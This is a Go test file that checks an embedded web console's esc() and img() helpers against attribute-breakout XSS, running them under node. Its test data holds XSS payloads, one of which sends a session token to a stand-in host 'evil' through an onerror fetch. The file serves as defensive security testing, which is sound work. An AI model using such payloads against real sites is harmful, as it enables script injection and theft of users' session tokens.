package ui

import (
	"encoding/json"
	"os/exec"
	"regexp"
	"strings"
	"testing"
)

// extractJSFunc returns the single-line `function name(...){ ... }` definition
// from the embedded console script. The console keeps its small helpers on one
// line, so a line match is exact and fails loudly if that ever changes.
func extractJSFunc(t *testing.T, name string) string {
	t.Helper()
	re := regexp.MustCompile(`(?m)^function ` + name + `\(.*$`)
	src := re.FindString(IndexHTML)
	if src == "" {
		t.Fatalf("function %s not found in embedded index.html", name)
	}
	return src
}

// TestEscCoversAttributeQuotes is the always-on static guard: esc() output is
// interpolated into quoted HTML attributes (img src, data-p, ...), so it must
// neutralise both quote characters, not just markup characters.
func TestEscCoversAttributeQuotes(t *testing.T) {
	esc := extractJSFunc(t, "esc")
	for _, want := range []string{`"&quot;"`, `"&#39;"`} {
		if !strings.Contains(esc, want) {
			t.Errorf("esc() does not map to %s; got: %s", want, esc)
		}
	}
}

// TestImgHostileURLStaysInsideSrc runs the real esc()/img() from the embedded
// file under node with a provider-supplied image_url that tries to close the
// src attribute and add an event handler. The rendered tag must keep exactly
// the hardcoded attribute set, with the whole payload inside src.
func TestImgHostileURLStaysInsideSrc(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not on PATH; static guard TestEscCoversAttributeQuotes still applies")
	}
	payloads := []string{
		`x" onerror="alert(document.domain)`,
		`x' onerror='alert(1)`,
		`https://cdn.example/a.jpg"><script>alert(1)</script>`,
		`x"onerror=fetch('//evil/'+sessionStorage.altune_op_token) "`,
	}
	in, err := json.Marshal(payloads)
	if err != nil {
		t.Fatal(err)
	}
	script := extractJSFunc(t, "esc") + "\n" + extractJSFunc(t, "img") + "\n" +
		"process.stdout.write(JSON.stringify(" + string(in) + ".map(img)));"
	out, err := exec.Command(node, "-e", script).Output()
	if err != nil {
		t.Fatalf("node: %v", err)
	}
	var rendered []string
	if err := json.Unmarshal(out, &rendered); err != nil {
		t.Fatalf("decode node output %q: %v", out, err)
	}
	// A double-quoted attribute value ends at the first `"`, so a value free of
	// `"` that is followed by the literal hardcoded tail proves no breakout.
	shape := regexp.MustCompile(`^<img class="art" src="([^"<>]*)" onerror="this\.style\.visibility='hidden'">$`)
	for i, html := range rendered {
		m := shape.FindStringSubmatch(html)
		if m == nil {
			t.Errorf("payload %q broke out of src: %s", payloads[i], html)
			continue
		}
		if strings.Contains(m[1], "'") {
			t.Errorf("payload %q left a raw single quote in src: %s", payloads[i], html)
		}
	}
}
